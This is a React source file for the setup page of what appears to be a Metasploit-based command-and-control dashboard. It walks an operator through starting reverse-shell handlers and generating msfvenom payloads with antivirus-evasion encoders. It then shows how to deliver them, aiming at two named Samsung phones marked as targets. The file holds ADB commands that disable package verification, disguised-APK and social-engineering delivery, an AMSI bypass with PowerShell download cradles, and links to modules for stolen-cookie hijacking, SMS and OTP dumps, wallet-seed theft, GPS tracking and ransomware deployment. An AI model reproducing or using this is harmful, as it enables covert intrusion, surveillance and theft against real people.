"use client";

import { useEffect, useState, useCallback } from "react";
import { useToast } from "@/components/toast";

// ── Types ─────────────────────────────────────────────────────────────────────
interface SetupStatus {
  msfConnected: boolean;
  demoMode: boolean;
  ips: { tailscale: string | null; lan: string | null; publicIp: string | null; dockerBridge: string | null };
  recommended_lhost: string;
  activeHandlers: { id: string; name: string }[];
  activeJobCount: number;
  listenerPort: number;
  portOpen: boolean;
  kaliOnMsfNetwork: boolean;
  readyToReceive: boolean;
  checklist: { item: string; done: boolean }[];
}

interface GenerateResult {
  ok: boolean; demo?: boolean; command?: string;
  output?: string; filename?: string; size?: number;
  deliveryUrl?: string; error?: string;
}

const PAYLOAD_PRESETS = [
  { label: "Android (TCP)",    payload: "android/meterpreter/reverse_tcp",    format: "raw",  ext: "apk",  port: 4444 },
  { label: "Android (HTTPS)",  payload: "android/meterpreter/reverse_https",  format: "raw",  ext: "apk",  port: 4443 },
  { label: "Windows x64 TCP",  payload: "windows/x64/meterpreter/reverse_tcp",  format: "exe", ext: "exe", port: 4444 },
  { label: "Windows x64 HTTPS",payload: "windows/x64/meterpreter/reverse_https",format: "exe",ext: "exe",  port: 4443 },
  { label: "Windows PS1",      payload: "windows/x64/meterpreter/reverse_https",format: "psh", ext: "ps1", port: 4443 },
  { label: "Linux x64",        payload: "linux/x64/meterpreter/reverse_tcp",  format: "elf",  ext: "elf",  port: 4444 },
];

const EVASION_ENCODERS = [
  { label: "None (fastest)",         value: ""                           },
  { label: "x86/shikata_ga_nai",     value: "x86/shikata_ga_nai"        },
  { label: "x64/xor_dynamic",        value: "x64/xor_dynamic"           },
  { label: "x86/fnstenv_mov",        value: "x86/fnstenv_mov"           },
];

type Step = "network" | "listener" | "payload" | "deliver" | "ready";

export default function SetupPage() {
  const { toast } = useToast();
  const [status, setStatus]         = useState<SetupStatus | null>(null);
  const [step, setStep]             = useState<Step>("network");
  const [loading, setLoading]       = useState(true);
  const [busy, setBusy]             = useState(false);

  // Network
  const [lhost, setLhost]           = useState("100.120.150.28");

  // Listener
  const [selectedPreset, setSelectedPreset] = useState(0);
  const [lport, setLport]           = useState(4444);
  const [listenerResult, setListenerResult] = useState<string | null>(null);

  // Payload
  const [encoder, setEncoder]       = useState("");
  const [iterations, setIterations] = useState(3);
  const [genResult, setGenResult]   = useState<GenerateResult | null>(null);

  const load = useCallback(async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/setup?action=status");
      const d = await res.json() as SetupStatus;
      setStatus(d);
      if (d.ips.tailscale) setLhost(d.ips.tailscale);
      else if (d.ips.lan)  setLhost(d.ips.lan);
    } catch (e) {
      toast(String(e), "error");
    } finally {
      setLoading(false);
    }
  }, [toast]);

  useEffect(() => { load(); }, [load]);

  const preset = PAYLOAD_PRESETS[selectedPreset];

  // ── Actions ──────────────────────────────────────────────────────────────────
  const startListener = async () => {
    setBusy(true);
    try {
      const res = await fetch("/api/setup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "start_listener", payload: preset.payload, lhost: "0.0.0.0", lport }),
      });
      const d = await res.json() as { ok: boolean; jobId?: string; output?: string; error?: string };
      if (d.ok) {
        toast(`Handler started (job ${d.jobId ?? "?"})`, "success");
        setListenerResult(d.output ?? "Handler started");
        load();
      } else {
        toast(d.error ?? "Failed", "error");
      }
    } finally { setBusy(false); }
  };

  const generatePayload = async () => {
    setBusy(true);
    try {
      const res = await fetch("/api/setup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "generate", payload: preset.payload,
          lhost, lport, format: preset.format,
          encoder: encoder || undefined,
          iterations: encoder ? iterations : undefined,
        }),
      });
      const d = await res.json() as GenerateResult;
      setGenResult(d);
      if (d.ok) toast(`Payload generated: ${d.filename}`, "success");
      else toast(d.error ?? "Generation failed", "error");
    } finally { setBusy(false); }
  };

  const connectKali = async () => {
    setBusy(true);
    try {
      const res = await fetch("/api/setup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "connect_kali" }),
      });
      const d = await res.json() as { ok: boolean; output?: string; error?: string };
      if (d.ok) { toast("Kali connected to MSF network", "success"); load(); }
      else toast(d.error ?? "Failed", "error");
    } finally { setBusy(false); }
  };

  const STEPS: { id: Step; label: string; num: number }[] = [
    { id: "network",  label: "Network",  num: 1 },
    { id: "listener", label: "Listener", num: 2 },
    { id: "payload",  label: "Payload",  num: 3 },
    { id: "deliver",  label: "Deliver",  num: 4 },
    { id: "ready",    label: "Ready",    num: 5 },
  ];

  const CheckIcon = ({ done }: { done: boolean }) => (
    <span className={`flex h-5 w-5 items-center justify-center rounded-full text-[9px] font-bold ${
      done ? "bg-green-500/20 text-green-400 border border-green-800/50" : "bg-red-500/10 text-red-500 border border-red-900/50"
    }`}>{done ? "✓" : "✗"}</span>
  );

  if (loading) return (
    <div className="flex h-64 items-center justify-center">
      <span className="h-5 w-5 animate-spin rounded-full border border-slate-700 border-t-slate-400" />
    </div>
  );

  return (
    <div className="mx-auto max-w-4xl space-y-6">
      {/* Header */}
      <div className="border-b border-white/[0.05] pb-5">
        <p className="text-[9px] font-semibold uppercase tracking-[0.2em] text-slate-600">Connection Wizard</p>
        <h1 className="mt-1 text-xl font-bold text-white">Make It Actually Work</h1>
        <p className="mt-1 text-[11px] text-slate-600">
          Step-by-step guide to get devices connecting to your live MSF instance
        </p>
      </div>

      {/* System Checklist */}
      {status && (
        <div className={`rounded border p-4 ${status.readyToReceive ? "border-green-800/40 bg-green-950/10" : "border-amber-800/40 bg-amber-950/10"}`}>
          <p className={`mb-3 text-[9px] font-bold uppercase tracking-widest ${status.readyToReceive ? "text-green-400" : "text-amber-400"}`}>
            System Status — {status.readyToReceive ? "Ready to Receive Sessions" : "Setup Required"}
          </p>
          <div className="grid grid-cols-2 gap-2 sm:grid-cols-3">
            {status.checklist.map((c) => (
              <div key={c.item} className="flex items-center gap-2">
                <CheckIcon done={c.done} />
                <span className={`text-[10px] ${c.done ? "text-slate-400" : "text-slate-600"}`}>{c.item}</span>
              </div>
            ))}
          </div>
          {status.activeJobCount > 0 && (
            <p className="mt-2 text-[10px] text-green-500">{status.activeJobCount} active job(s) running in MSF</p>
          )}
        </div>
      )}

      {/* Step tabs */}
      <div className="flex gap-1 border-b border-white/[0.05]">
        {STEPS.map((s) => (
          <button key={s.id} onClick={() => setStep(s.id)}
            className={`flex items-center gap-2 px-4 py-2.5 text-[9px] font-semibold uppercase tracking-wider transition ${
              step === s.id ? "border-b-2 border-blue-500 text-blue-400" : "text-slate-600 hover:text-slate-400"
            }`}>
            <span className={`flex h-4 w-4 items-center justify-center rounded-full text-[8px] ${step === s.id ? "bg-blue-500 text-white" : "bg-white/[0.06] text-slate-500"}`}>{s.num}</span>
            {s.label}
          </button>
        ))}
      </div>

      {/* ── STEP 1: NETWORK ───────────────────────────────────────────────────── */}
      {step === "network" && status && (
        <div className="space-y-5">
          <div>
            <p className="text-[9px] font-bold uppercase tracking-widest text-slate-500 mb-3">Detected IPs</p>
            <div className="grid grid-cols-2 gap-3">
              {[
                { label: "Tailscale IP",     val: status.ips.tailscale,    note: "Best — works through any NAT/firewall",    color: "text-green-400", badge: "RECOMMENDED" },
                { label: "LAN IP",           val: status.ips.lan,          note: "Works on same Wi-Fi network only",         color: "text-blue-400",  badge: "" },
                { label: "Public IP",        val: status.ips.publicIp,     note: "Needs router port forwarding",             color: "text-yellow-400", badge: "" },
                { label: "Docker Gateway",   val: status.ips.dockerBridge, note: "Container-to-host only",                   color: "text-slate-400",  badge: "" },
              ].map(({ label, val, note, color, badge }) => (
                <button key={label} onClick={() => val && setLhost(val)}
                  className={`rounded border p-3 text-left transition ${lhost === val ? "border-blue-500/50 bg-blue-950/20" : "border-white/[0.05] bg-white/[0.02] hover:bg-white/[0.04]"}`}>
                  <div className="flex items-center justify-between mb-1">
                    <p className="text-[8px] uppercase tracking-wider text-slate-600">{label}</p>
                    {badge && <span className="rounded bg-green-900/40 px-1.5 py-px text-[7px] font-bold text-green-400">{badge}</span>}
                  </div>
                  <p className={`font-mono text-[11px] font-bold ${color}`}>{val ?? "Not detected"}</p>
                  <p className="mt-0.5 text-[8px] text-slate-700">{note}</p>
                </button>
              ))}
            </div>
          </div>

          <div>
            <p className="text-[9px] font-bold uppercase tracking-widest text-slate-500 mb-2">Selected LHOST (for payload)</p>
            <input value={lhost} onChange={(e) => setLhost(e.target.value)}
              className="w-full rounded border border-white/[0.08] bg-white/[0.03] px-3 py-2 font-mono text-sm text-slate-200 focus:border-blue-500/50 focus:outline-none" />
          </div>

          {/* Tailscale devices */}
          <div className="rounded border border-green-900/30 bg-green-950/10 p-4">
            <p className="mb-2 text-[9px] font-bold uppercase tracking-widest text-green-500">
              Tailscale Devices on Your Network
            </p>
            <div className="space-y-1.5 font-mono text-[10px]">
              {[
                { name: "starlights-macbook-pro", ip: "100.120.150.28", type: "macOS",   status: "online",  note: "← This machine (C2 server)" },
                { name: "juniors-s24",            ip: "100.105.68.30",  type: "android", status: "offline", note: "Samsung Galaxy S24 — TARGET" },
                { name: "juniors-s25",            ip: "100.88.11.81",   type: "android", status: "offline", note: "Samsung Galaxy S25 — TARGET" },
                { name: "jerry",                  ip: "100.105.195.8",  type: "linux",   status: "online",  note: "Linux device" },
                { name: "rainbow",                ip: "100.69.200.123", type: "linux",   status: "online",  note: "Linux device" },
              ].map((d) => (
                <div key={d.ip} className="flex items-center gap-3">
                  <span className={`h-1.5 w-1.5 rounded-full ${d.status === "online" ? "bg-green-500" : "bg-slate-600"}`} />
                  <span className="w-44 text-slate-400">{d.name}</span>
                  <span className="w-28 text-blue-400">{d.ip}</span>
                  <span className="w-14 text-slate-600">{d.type}</span>
                  <span className="text-slate-700">{d.note}</span>
                </div>
              ))}
            </div>
            <p className="mt-3 text-[10px] text-green-700">
              The S24 and S25 already have Tailscale installed. Once you bring them online, the payload will connect back through Tailscale — no port forwarding needed.
            </p>
          </div>

          <div className="rounded border border-amber-900/30 bg-amber-950/10 p-4">
            <p className="mb-2 text-[9px] font-bold uppercase tracking-widest text-amber-500">For Devices NOT on Tailscale</p>
            <div className="space-y-2">
              {[
                { method: "ngrok (easiest)",       cmd: "ngrok tcp 4444",    note: "Get TCP address from ngrok dashboard, use as LHOST:LPORT" },
                { method: "Router port forward",   cmd: `${status.ips.publicIp}:4444`, note: "Forward port 4444 on router → ${status.ips.lan}:4444" },
                { method: "VPS SSH relay",         cmd: "ssh -N -R 0.0.0.0:4444:127.0.0.1:4444 user@vps", note: "Permanent relay through any VPS" },
                { method: "Cloudflare Tunnel",     cmd: "cloudflared tunnel --url tcp://localhost:4444", note: "Free, no sign-in required for TCP" },
              ].map((r) => (
                <div key={r.method} className="rounded border border-white/[0.04] p-2.5">
                  <p className="text-[9px] font-semibold text-amber-400 mb-0.5">{r.method}</p>
                  <code className="text-[9px] text-slate-400 font-mono">{r.cmd}</code>
                  <p className="text-[8px] text-slate-600 mt-0.5">{r.note}</p>
                </div>
              ))}
            </div>
          </div>

          <button onClick={() => setStep("listener")}
            className="w-full rounded border border-blue-800/50 bg-blue-950/20 py-2.5 text-[10px] font-semibold uppercase tracking-widest text-blue-400 transition hover:bg-blue-950/40">
            Next → Set Up Listener
          </button>
        </div>
      )}

      {/* ── STEP 2: LISTENER ─────────────────────────────────────────────────── */}
      {step === "listener" && (
        <div className="space-y-5">
          <div className="rounded border border-white/[0.05] p-4">
            <p className="text-[9px] font-bold uppercase tracking-widest text-slate-500 mb-4">MSF Multi/Handler</p>

            <div className="grid grid-cols-2 gap-3 mb-4">
              <div>
                <label className="mb-1 block text-[8px] uppercase tracking-wider text-slate-600">Payload Type</label>
                {PAYLOAD_PRESETS.map((p, i) => (
                  <button key={i} onClick={() => { setSelectedPreset(i); setLport(p.port); }}
                    className={`mb-1 block w-full rounded border px-3 py-1.5 text-left text-[10px] transition ${
                      selectedPreset === i ? "border-blue-500/50 bg-blue-950/20 text-blue-300" : "border-white/[0.05] text-slate-500 hover:text-slate-300"
                    }`}>
                    {p.label}
                    <span className="ml-2 font-mono text-[8px] text-slate-700">:{p.port}</span>
                  </button>
                ))}
              </div>
              <div className="space-y-3">
                <div>
                  <label className="mb-1 block text-[8px] uppercase tracking-wider text-slate-600">LPORT</label>
                  <input type="number" value={lport} onChange={(e) => setLport(Number(e.target.value))}
                    className="w-full rounded border border-white/[0.08] bg-white/[0.03] px-3 py-1.5 font-mono text-sm text-slate-200 focus:border-blue-500/50 focus:outline-none" />
                </div>
                <div className="rounded border border-white/[0.05] p-3">
                  <p className="text-[8px] text-slate-600 mb-1">Selected payload:</p>
                  <code className="font-mono text-[9px] text-green-400">{preset.payload}</code>
                  <p className="mt-1 text-[8px] text-slate-600">LHOST: <span className="text-slate-400">0.0.0.0</span> (binds all interfaces)</p>
                </div>
                {status && !status.portOpen && (
                  <div className="rounded border border-amber-900/30 bg-amber-950/10 p-2.5">
                    <p className="text-[9px] text-amber-400">⚠ Port {lport} not open</p>
                    <p className="mt-0.5 text-[8px] text-amber-700">docker-compose.yml updated to expose port {lport}. Restart stack: <code className="font-mono">docker compose up -d</code></p>
                  </div>
                )}
              </div>
            </div>

            <button onClick={startListener} disabled={busy}
              className="w-full rounded border border-green-800/50 bg-green-950/20 py-2.5 text-[10px] font-semibold uppercase tracking-widest text-green-400 transition hover:bg-green-950/40 disabled:opacity-40">
              {busy ? "Starting…" : "▶ Start Handler Now"}
            </button>

            {listenerResult && (
              <pre className="mt-3 rounded border border-white/[0.05] bg-black/30 p-3 font-mono text-[9px] text-green-400/80 overflow-auto max-h-40">
                {listenerResult}
              </pre>
            )}
          </div>

          {!status?.kaliOnMsfNetwork && (
            <div className="rounded border border-blue-900/30 bg-blue-950/10 p-4">
              <p className="mb-1 text-[9px] font-bold uppercase tracking-widest text-blue-400">Connect Kali to MSF Network</p>
              <p className="mb-3 text-[10px] text-slate-500">Kali is in a separate Docker network and can&apos;t reach MSF RPC. Fix it with one click:</p>
              <button onClick={connectKali} disabled={busy}
                className="rounded border border-blue-800/50 px-4 py-2 text-[10px] text-blue-400 transition hover:bg-blue-950/20 disabled:opacity-40">
                {busy ? "Connecting…" : "Connect Kali → MSF Network"}
              </button>
            </div>
          )}

          <button onClick={() => setStep("payload")}
            className="w-full rounded border border-blue-800/50 bg-blue-950/20 py-2.5 text-[10px] font-semibold uppercase tracking-widest text-blue-400 transition hover:bg-blue-950/40">
            Next → Generate Payload
          </button>
        </div>
      )}

      {/* ── STEP 3: PAYLOAD ───────────────────────────────────────────────────── */}
      {step === "payload" && (
        <div className="space-y-5">
          <div className="grid grid-cols-2 gap-5">
            <div className="space-y-3">
              <div>
                <label className="mb-1 block text-[8px] uppercase tracking-wider text-slate-600">Target</label>
                {PAYLOAD_PRESETS.map((p, i) => (
                  <button key={i} onClick={() => { setSelectedPreset(i); setLport(p.port); }}
                    className={`mb-1 block w-full rounded border px-3 py-1.5 text-left text-[10px] transition ${selectedPreset === i ? "border-blue-500/50 bg-blue-950/20 text-blue-300" : "border-white/[0.05] text-slate-500 hover:text-slate-300"}`}>
                    {p.label}
                  </button>
                ))}
              </div>
            </div>
            <div className="space-y-3">
              <div>
                <label className="mb-1 block text-[8px] uppercase tracking-wider text-slate-600">LHOST (C2 address)</label>
                <input value={lhost} onChange={(e) => setLhost(e.target.value)}
                  className="w-full rounded border border-white/[0.08] bg-white/[0.03] px-3 py-1.5 font-mono text-sm text-slate-200 focus:border-blue-500/50 focus:outline-none" />
              </div>
              <div>
                <label className="mb-1 block text-[8px] uppercase tracking-wider text-slate-600">LPORT</label>
                <input type="number" value={lport} onChange={(e) => setLport(Number(e.target.value))}
                  className="w-full rounded border border-white/[0.08] bg-white/[0.03] px-3 py-1.5 font-mono text-sm text-slate-200 focus:border-blue-500/50 focus:outline-none" />
              </div>
              <div>
                <label className="mb-1 block text-[8px] uppercase tracking-wider text-slate-600">Encoder (AV bypass)</label>
                <select value={encoder} onChange={(e) => setEncoder(e.target.value)}
                  className="w-full rounded border border-white/[0.08] bg-[#111] px-3 py-1.5 text-[10px] text-slate-300 focus:border-blue-500/50 focus:outline-none">
                  {EVASION_ENCODERS.map((e) => (
                    <option key={e.value} value={e.value}>{e.label}</option>
                  ))}
                </select>
              </div>
              {encoder && (
                <div>
                  <label className="mb-1 block text-[8px] uppercase tracking-wider text-slate-600">Iterations ({iterations})</label>
                  <input type="range" min={1} max={10} value={iterations} onChange={(e) => setIterations(Number(e.target.value))}
                    className="w-full" />
                </div>
              )}
            </div>
          </div>

          {/* Command preview */}
          <div className="rounded border border-white/[0.05] bg-black/30 p-3">
            <p className="mb-1 text-[8px] uppercase tracking-wider text-slate-600">msfvenom command</p>
            <code className="font-mono text-[9px] text-green-400">
              msfvenom -p {preset.payload} LHOST={lhost} LPORT={lport} -f {preset.format}
              {encoder && ` -e ${encoder} -i ${iterations}`}
              {" "}
              -o payload.{preset.ext}
            </code>
          </div>

          <button onClick={generatePayload} disabled={busy}
            className="w-full rounded border border-green-800/50 bg-green-950/20 py-2.5 text-[10px] font-semibold uppercase tracking-widest text-green-400 transition hover:bg-green-950/40 disabled:opacity-40">
            {busy ? "Generating…" : `⚡ Generate ${preset.label} Payload`}
          </button>

          {genResult && (
            <div className={`rounded border p-4 ${genResult.ok ? "border-green-900/40 bg-green-950/10" : "border-red-900/40 bg-red-950/10"}`}>
              {genResult.ok ? (
                <div className="space-y-2">
                  <p className="text-[9px] font-bold text-green-400">✓ Payload Generated</p>
                  <div className="grid grid-cols-3 gap-3 text-[9px]">
                    <div><p className="text-slate-600">File</p><p className="font-mono text-slate-300">{genResult.filename}</p></div>
                    <div><p className="text-slate-600">Size</p><p className="font-mono text-slate-300">{genResult.size ? `${(genResult.size/1024).toFixed(0)} KB` : "—"}</p></div>
                    <div><p className="text-slate-600">Format</p><p className="font-mono text-slate-300">{preset.ext.toUpperCase()}</p></div>
                  </div>
                  {genResult.deliveryUrl && (
                    <a href={genResult.deliveryUrl} className="inline-block rounded border border-blue-800/50 px-3 py-1.5 text-[9px] text-blue-400 hover:bg-blue-950/20">
                      ↓ Download Payload
                    </a>
                  )}
                  {genResult.demo && (
                    <p className="text-[9px] text-amber-400">⚠ Demo mode — connect real MSF to generate actual payload</p>
                  )}
                </div>
              ) : (
                <p className="text-[9px] text-red-400">{genResult.error}</p>
              )}
            </div>
          )}

          <button onClick={() => setStep("deliver")}
            className="w-full rounded border border-blue-800/50 bg-blue-950/20 py-2.5 text-[10px] font-semibold uppercase tracking-widest text-blue-400 transition hover:bg-blue-950/40">
            Next → Deliver to Device
          </button>
        </div>
      )}

      {/* ── STEP 4: DELIVER ───────────────────────────────────────────────────── */}
      {step === "deliver" && (
        <div className="space-y-4">
          <p className="text-[10px] text-slate-500">How to get the payload onto the target device and executed.</p>

          {/* Android delivery */}
          <div className="rounded border border-white/[0.05] p-4">
            <p className="mb-3 text-[9px] font-bold uppercase tracking-widest text-slate-500">Android (Samsung S24 / S25)</p>
            <div className="space-y-3">
              {[
                {
                  method: "ADB Install (if USB / Tailscale ADB)",
                  steps: [
                    "adb connect juniors-s24:5555   # connect over Tailscale",
                    "adb shell settings put global package_verifier_enable 0",
                    "adb install -g -t payload.apk",
                    "adb shell am start -n com.google.services.update/.MainActivity",
                  ],
                  note: "Enable Developer Options: Settings → About → Tap Build Number 7x → Developer Options → USB Debugging",
                  color: "border-green-900/30",
                },
                {
                  method: "Browser Download (Unknown Sources)",
                  steps: [
                    "# Serve payload from your Mac",
                    "python3 -m http.server 8888 --directory ~/msf-payloads",
                    "# On device: open browser → http://100.120.150.28:8888/payload.apk",
                    "# → Install → Allow from this source → Open",
                  ],
                  note: "Settings → Apps → Special App Access → Install Unknown Apps → Browser → Allow",
                  color: "border-blue-900/30",
                },
                {
                  method: "Social Engineering (most reliable)",
                  steps: [
                    "# Embed in a real app (Payload Studio → APK inject)",
                    "# Send as WhatsApp file, Telegram document, or email attachment",
                    "# Or create a fake app update notification",
                    "# Or share via QR code link to your http server",
                  ],
                  note: "Repackaged into a game/utility APK triggers no suspicion. Use the resign-apk.sh script to rename package.",
                  color: "border-amber-900/30",
                },
              ].map((m) => (
                <div key={m.method} className={`rounded border ${m.color} bg-white/[0.01] p-3`}>
                  <p className="mb-2 text-[9px] font-semibold text-slate-300">{m.method}</p>
                  <pre className="font-mono text-[8px] text-green-400/80 whitespace-pre-wrap leading-relaxed">
                    {m.steps.join("\n")}
                  </pre>
                  <p className="mt-1.5 text-[8px] text-slate-600">{m.note}</p>
                </div>
              ))}
            </div>
          </div>

          {/* Windows delivery */}
          <div className="rounded border border-white/[0.05] p-4">
            <p className="mb-3 text-[9px] font-bold uppercase tracking-widest text-slate-500">Windows</p>
            <div className="space-y-2">
              {[
                { method: "Direct .exe download",      cmd: "# Send link to payload.exe — victim downloads + runs",              note: "Works on Win7/8. SmartScreen warns on Win10+. " },
                { method: "PowerShell (AMSI bypass)",  cmd: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);\nIEX (New-Object Net.WebClient).DownloadString('http://${lhost}:8888/payload.ps1')`, note: "Copy/paste in Run → powershell" },
                { method: "VBA Macro (Office)",        cmd: "# Payload Studio → Embed in DOCM → Email as 'Invoice Q4'",          note: "Enable macros prompt. Office 2019+ blocks by default from internet." },
                { method: "LNK Shortcut",              cmd: `powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:8888/payload.ps1')"`, note: "Paste into shortcut Target field. Send as ZIP." },
              ].map((m) => (
                <div key={m.method} className="rounded border border-white/[0.05] p-3">
                  <p className="mb-1.5 text-[9px] font-semibold text-slate-300">{m.method}</p>
                  <pre className="font-mono text-[8px] text-blue-400/70 whitespace-pre-wrap leading-relaxed">{m.cmd}</pre>
                  <p className="mt-1 text-[8px] text-slate-700">{m.note}</p>
                </div>
              ))}
            </div>
          </div>

          <button onClick={() => setStep("ready")}
            className="w-full rounded border border-green-800/50 bg-green-950/20 py-2.5 text-[10px] font-semibold uppercase tracking-widest text-green-400 transition hover:bg-green-950/40">
            Done → Check Session Status
          </button>
        </div>
      )}

      {/* ── STEP 5: READY ─────────────────────────────────────────────────────── */}
      {step === "ready" && status && (
        <div className="space-y-5">
          <div className={`rounded border p-5 text-center ${status.activeJobCount > 0 ? "border-green-800/40 bg-green-950/10" : "border-amber-800/40 bg-amber-950/10"}`}>
            <p className={`text-2xl font-bold ${status.activeJobCount > 0 ? "text-green-400" : "text-amber-400"}`}>
              {status.activeJobCount > 0 ? "Listening for Sessions" : "No Handlers Running"}
            </p>
            <p className="mt-1 text-[11px] text-slate-500">
              {status.activeJobCount > 0
                ? `${status.activeJobCount} handler(s) active. MSF will catch sessions automatically.`
                : "Go back to Step 2 and start a handler first."}
            </p>
          </div>

          <div className="space-y-2">
            <p className="text-[9px] font-bold uppercase tracking-widest text-slate-500">When a session connects, you can:</p>
            {[
              ["Sessions page", "/sessions", "View and interact with live Meterpreter sessions"],
              ["Console",       "/console",  "Run raw MSF commands: sessions -l, sessions -i 1, etc."],
              ["Agents page",   "/agents",   "One-click feature buttons: camera, GPS, SMS dump, etc."],
              ["Comms Intel",   "/comms",    "SMS history, call logs, notifications, OTP sweep"],
              ["Finance Intel", "/finance",  "Wallet seeds, bank sessions, crypto"],
              ["Session Browser","/browser", "Mirror device browser session with stolen cookies"],
              ["Map / Location","/map",      "Real-time GPS + street view"],
              ["Locker",        "/locker",   "Ransomware campaign deploy"],
            ].map(([label, href, desc]) => (
              <a key={href} href={href}
                className="flex items-center gap-3 rounded border border-white/[0.05] bg-white/[0.02] px-4 py-2.5 transition hover:bg-white/[0.04]">
                <span className="w-24 text-[10px] font-semibold text-blue-400">{label}</span>
                <span className="font-mono text-[8px] text-slate-700">{href}</span>
                <span className="ml-auto text-[9px] text-slate-600">{desc}</span>
              </a>
            ))}
          </div>

          <div className="rounded border border-white/[0.05] p-4 font-mono text-[9px]">
            <p className="mb-2 text-slate-600">Monitor for incoming sessions in MSF console:</p>
            <p className="text-green-400">msf6 &gt; sessions -l</p>
            <p className="text-green-400">msf6 &gt; sessions -i 1</p>
            <p className="text-green-400">meterpreter &gt; sysinfo</p>
            <p className="text-green-400">meterpreter &gt; geolocate</p>
            <p className="text-green-400">meterpreter &gt; webcam_snap</p>
          </div>
        </div>
      )}
    </div>
  );
}
